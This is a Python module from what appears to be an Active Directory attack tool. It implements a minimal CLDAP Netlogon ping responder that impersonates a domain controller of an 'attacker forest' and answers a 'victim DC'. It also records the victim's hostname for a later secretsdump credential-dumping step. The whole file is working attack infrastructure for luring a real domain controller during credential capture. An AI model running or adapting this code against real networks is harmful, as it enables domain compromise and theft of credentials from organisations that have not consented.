"""Minimal CLDAP LDAP-ping (DC-locator) responder.

Implements exactly one operation, the one the victim DC used in the golden capture:

  * UDP/389 base-object RootDSE search, filter containing ``DnsDomain`` /
    ``NtVer`` / ``Host`` / ``DnsHostName`` equality matches, attribute
    ``Netlogon`` -> one ``SearchResultEntry`` carrying a
    ``NETLOGON_SAM_LOGON_RESPONSE_EX`` blob + one successful ``SearchResultDone``.

The Netlogon structure is not exposed by impacket and impacket's
``ldapasn1`` Filter schema cannot decode real Windows ping filters, so both
request parsing (strict BER walk) and response encoding are local.  No
directory services are implemented; anything that is not a Netlogon ping is
ignored.
"""

from __future__ import annotations

import logging
import struct

from .keys import ResponderConfig

log = logging.getLogger("cldap")

SCOPE_BASE = 0
# LOGON_SAM_LOGON_RESPONSE_EX
OPCODE = 0x0017
# DS|LDAP|KDC|TIMESERV|GOOD_TIMESERV|NTP|CLOSEST|WRITABLE|DNS_DOMAIN|
# DNS_CONTROLLER|DNS_FOREST  (golden Samba value 0x13fd)
DEFAULT_FLAGS = 0x13FD
# Fixed golden tail: Version 5, NT4 timestamp 0xFFFFFFFF
TAIL = struct.pack("<II", 5, 0xFFFFFFFF)

TAG_SEARCH_REQUEST = 0x63  # [APPLICATION 3]


# -- strict BER parsing helpers ----------------------------------------------


class BerError(ValueError):
    pass


def _tlv(buf: bytes, i: int) -> tuple[int, int, int]:
    """Parse one TLV at *i*; returns (tag, content_start, content_end)."""
    if i + 2 > len(buf):
        raise BerError("truncated TLV header")
    tag = buf[i]
    j = i + 1
    n = buf[j]
    if n & 0x80:
        k = n & 0x7F
        if k == 0 or j + 1 + k > len(buf):
            raise BerError("bad long-form length")
        n = int.from_bytes(buf[j + 1 : j + 1 + k], "big")
        j += 1 + k
    else:
        j += 1
    if j + n > len(buf):
        raise BerError("TLV content overruns buffer")
    return tag, j, j + n


def _walk_filter(content: bytes, terms: dict[str, bytes]) -> None:
    """Collect equalityMatch AVAs from a filter blob (recursively)."""
    i = 0
    while i < len(content):
        tag, c0, c1 = _tlv(content, i)
        body = content[c0:c1]
        if tag in (0xA0, 0xA1, 0xA2):  # and / or / not: recurse
            _walk_filter(body, terms)
        elif tag == 0xA3:  # equalityMatch: SEQUENCE { attributeDesc, assertionValue }
            parts = _iter_sequence(body)
            if len(parts) != 2:
                raise BerError("equalityMatch with unexpected shape")
            (t1, d1), (t2, d2) = parts
            if t1 != 0x04 or t2 != 0x04:
                raise BerError("equalityMatch values are not octet strings")
            terms[d1.decode("utf-8", "replace").lower()] = d2
        # other filter choices are irrelevant for a ping; skip
        i = c1


def _iter_sequence(content: bytes):
    """Yield (tag, data) TLVs of a SEQUENCE/SET content."""
    out, i = [], 0
    while i < len(content):
        tag, c0, c1 = _tlv(content, i)
        out.append((tag, content[c0:c1]))
        i = c1
    return out


def parse_ping(data: bytes) -> tuple[int, dict[str, bytes], list[str]]:
    """Parse a CLDAP Netlogon ping; returns (messageID, filter_terms, attributes).

    Raises BerError for anything that is not a base-scope search asking for
    the Netlogon attribute.
    """
    tag, c0, c1 = _tlv(data, 0)
    if tag != 0x30 or c1 != len(data):
        raise BerError("not an LDAPMessage SEQUENCE")
    msg_fields = _iter_sequence(data[c0:c1])
    if len(msg_fields) < 2 or msg_fields[0][0] != 0x02:
        raise BerError("LDAPMessage without leading messageID")
    msg_id = int.from_bytes(msg_fields[0][1], "big", signed=True)
    if not 1 <= msg_id <= 0x7FFFFFFF:
        raise BerError(f"invalid messageID {msg_id}")
    if msg_fields[1][0] != TAG_SEARCH_REQUEST:
        raise BerError(f"protocolOp tag {msg_fields[1][0]:#x} is not searchRequest")

    fields = _iter_sequence(msg_fields[1][1])
    if len(fields) != 8:
        raise BerError(f"searchRequest has {len(fields)} fields (expected 8)")
    base_object, scope, _deref, _size, _time, _types_only, filter_tlv, attrs_tlv = fields
    if base_object[0] != 0x04 or base_object[1]:
        raise BerError("search base is not an empty octet string (RootDSE only)")
    if scope[0] != 0x0A or int.from_bytes(scope[1], "big") != SCOPE_BASE:
        raise BerError("search scope is not baseObject")

    if filter_tlv[0] not in range(0xA0, 0xAA):
        raise BerError("invalid search filter tag")
    if attrs_tlv[0] != 0x30:
        raise BerError("attribute selection is not a SEQUENCE")

    terms: dict[str, bytes] = {}
    _walk_filter(filter_tlv[1], terms)

    attrs = []
    for t, d in _iter_sequence(attrs_tlv[1]):
        if t != 0x04:
            raise BerError("attribute selection item is not an octet string")
        attrs.append(d.decode("utf-8", "replace").lower())

    if "netlogon" not in attrs:
        raise BerError("search does not request the Netlogon attribute")
    return msg_id, terms, attrs


# -- Netlogon response ---------------------------------------------------------


def _encode_name(labels: list[str], offsets: dict[str, int], blob: bytearray) -> None:
    """Append a DNS-style compressed name to *blob* (RFC 1035 labels+pointers).

    *offsets* maps every name suffix to the offset of its length byte inside
    *blob*; the first name written defines the compression targets used by
    later names, exactly like the Samba golden blob.
    """
    for i in range(len(labels)):
        suffix = ".".join(labels[i:])
        ptr = offsets.get(suffix)
        if ptr is not None and ptr < 0x4000:
            blob += struct.pack(">H", 0xC000 | ptr)
            return
        offsets[suffix] = len(blob)
        blob += bytes([len(labels[i])]) + labels[i].encode()
    blob += b"\x00"


def build_netlogon_blob(cfg: ResponderConfig) -> bytes:
    """Encode NETLOGON_SAM_LOGON_RESPONSE_EX for the attacker forest."""
    blob = bytearray()
    blob += struct.pack("<HHI", OPCODE, 0, DEFAULT_FLAGS)
    blob += cfg.domain_guid
    offsets: dict[str, int] = {}

    labels_forest = cfg.domain.split(".")
    labels_site = cfg.site.split(".")
    _encode_name(labels_forest, offsets, blob)  # DnsForestName
    _encode_name(labels_forest, offsets, blob)  # DnsDomainName -> ptr
    _encode_name(cfg.dc_fqdn.split("."), offsets, blob)  # DnsHostName
    # nbt_string: one-byte length + string + NUL (MS-NRPC)
    blob += bytes([len(cfg.netbios_domain)]) + cfg.netbios_domain.encode() + b"\x00"  # NetbiosDomainName
    blob += bytes([len(cfg.dc_name)]) + cfg.dc_name.encode() + b"\x00"  # NetbiosComputerName
    blob += b"\x00"  # UserName
    _encode_name(labels_site, offsets, blob)  # DCSiteName
    _encode_name(labels_site, offsets, blob)  # ClientSiteName -> ptr
    blob += TAIL
    return bytes(blob)


# -- tiny DER helpers for the hand-built LDAP response ----------------------


def _der(tag: bytes, content: bytes) -> bytes:
    n = len(content)
    if n < 0x80:
        length = bytes([n])
    else:
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
        length = bytes([0x80 | len(raw)]) + raw
    return tag + length + content


def _octets(b: bytes) -> bytes:
    return _der(b"\x04", b)


def _integer(n: int) -> bytes:
    if n == 0:
        return _der(b"\x02", b"\x00")
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return _der(b"\x02", raw)


def build_response(msg_id: int, cfg: ResponderConfig) -> bytes:
    """Two LDAPMessages in one datagram (golden Samba wire shape):
    SearchResultEntry followed by a standalone SearchResultDone."""
    blob = build_netlogon_blob(cfg)
    # PartialAttribute { type, SET { value } } / PartialAttributeList
    pa = _der(b"\x30", _octets(b"netlogon") + _der(b"\x31", _octets(blob)))
    attrs = _der(b"\x30", pa)
    entry = _der(b"\x64", _octets(b"") + attrs)  # [APPLICATION 4]
    done = _der(b"\x65", _der(b"\x0a", b"\x00") + _octets(b"") + _octets(b""))  # [APPLICATION 5]
    return _der(b"\x30", _integer(msg_id) + entry) + _der(b"\x30", _integer(msg_id) + done)


# -- UDP entry point -----------------------------------------------------------


def handle_datagram(data: bytes, addr, cfg: ResponderConfig) -> bytes | None:
    if len(data) > 2048:
        log.warning("oversized CLDAP datagram from %s (%d bytes) dropped", addr, len(data))
        return None
    try:
        msg_id, terms, _attrs = parse_ping(data)
    except BerError as exc:
        log.info("CLDAP message from %s ignored (%s)", addr[0], exc)
        return None

    # Only answer pings about our own realm (case-insensitive)
    asked = terms.get("dnsdomain", b"").decode("utf-8", "replace").upper()
    if asked not in (cfg.realm, cfg.domain.upper()):
        log.info("CLDAP ping from %s for foreign domain %r ignored", addr[0], asked)
        return None

    # Remember the victim DC's own hostname (from the DnsHostName filter term)
    # for the post-capture secretsdump hint.
    victim_host = terms.get("dnshostname")
    if victim_host:
        cfg.victim_dc_fqdn = victim_host.decode("utf-8", "replace").lower().rstrip(".")

    log.info("CLDAP Netlogon ping from %s (realm=%s) -> NETLOGON_SAM_LOGON_RESPONSE_EX", addr[0], cfg.realm)
    return build_response(msg_id, cfg)
